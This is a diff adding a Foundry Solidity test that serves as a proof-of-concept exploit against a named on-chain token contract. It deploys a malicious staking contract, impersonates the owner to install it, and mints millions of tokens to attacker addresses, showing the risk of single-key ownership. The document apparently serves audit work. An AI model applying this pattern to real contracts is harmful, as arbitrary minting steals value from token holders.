@@ -1,0 +1,75 @@
+```solidity
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+interface IBNRG {
+    function owner() external view returns (address);
+    function setStakingContract(address stakingContractAddress_) external;
+    function deliver(address user, uint256 numTokens) external;
+    function balanceOf(address account) external view returns (uint256);
+    function totalSupply() external view returns (uint256);
+}
+
+contract MaliciousStaking {
+    IBNRG public bnrToken;
+
+    constructor(address _bnr) {
+        bnrToken = IBNRG(_bnr);
+    }
+
+    function mintTo(address user, uint256 amount) external {
+        bnrToken.deliver(user, amount);
+    }
+}
+
+contract ExploitTest is Test {
+    address constant BNRG_ADDRESS = 0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C;
+    IBNRG public bnrToken;
+    MaliciousStaking public malicious;
+
+    function setUp() public {
+        bnrToken = IBNRG(BNRG_ADDRESS);
+        // Deploy malicious staking contract
+        malicious = new MaliciousStaking(BNRG_ADDRESS);
+        vm.label(address(bnrToken), "BNRG");
+        vm.label(address(malicious), "MaliciousStaking");
+    }
+
+    function testExploitLackOfMultiSig() public {
+        // Get the owner of BNRG
+        address owner = bnrToken.owner();
+        vm.label(owner, "Owner");
+
+        // Baseline: attacker balance before
+        address attacker = address(0xBAD);
+        uint256 balanceBefore = bnrToken.balanceOf(attacker);
+        uint256 supplyBefore = bnrToken.totalSupply();
+        emit log_named_uint("Attacker balance before", balanceBefore);
+        emit log_named_uint("Total supply before", supplyBefore);
+
+        // Owner sets the staking contract to our malicious contract
+        vm.prank(owner);
+        bnrToken.setStakingContract(address(malicious));
+
+        // Now malicious contract (acting as staking) can mint tokens arbitrarily
+        uint256 mintAmount = 1_000_000 * 1e18; // 1 million tokens
+        malicious.mintTo(attacker, mintAmount);
+
+        // Assert that attacker's balance increased
+        uint256 balanceAfter = bnrToken.balanceOf(attacker);
+        emit log_named_uint("Attacker balance after", balanceAfter);
+        assertEq(balanceAfter - balanceBefore, mintAmount, "Attacker did not receive minted tokens");
+
+        // Total supply should have increased
+        uint256 supplyAfter = bnrToken.totalSupply();
+        assertEq(supplyAfter - supplyBefore, mintAmount, "Total supply did not increase");
+
+        // Verify that the owner can repeat this arbitrary minting
+        // (e.g., mint to another address)
+        address attacker2 = address(0xBEEF);
+        malicious.mintTo(attacker2, 500_000 * 1e18);
+        assertEq(bnrToken.balanceOf(attacker2), 500_000 * 1e18, "Second mint failed");
+    }
+}
+```
